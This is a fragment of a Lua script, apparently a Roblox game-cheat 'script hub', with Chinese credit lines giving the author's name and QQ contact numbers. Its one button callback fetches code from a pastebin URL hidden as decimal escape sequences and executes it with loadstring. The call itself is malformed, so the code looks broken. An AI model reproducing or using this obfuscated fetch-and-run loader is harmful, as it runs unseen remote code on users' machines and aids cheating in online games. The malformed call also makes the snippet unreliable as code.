...
about:AddParagraph("该USA为测试版，永久免费")
about:AddParagraph("脚本免费脚本 请勿去圈钱")
about:AddParagraph("作者:莫羽 ")
about:AddParagraph("作者QQ:2399784507 更新以及反馈QQ群:789373881")
about:AddParagraph("别倒卖噢年轻人 ")
-----------------------------------------------------------------------------------------------------
...
Tab:AddButton({
	...
	TextDisappear = true,
	Callback = function()
		loadstring(game:HttpGet('loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()'))()
	end
})
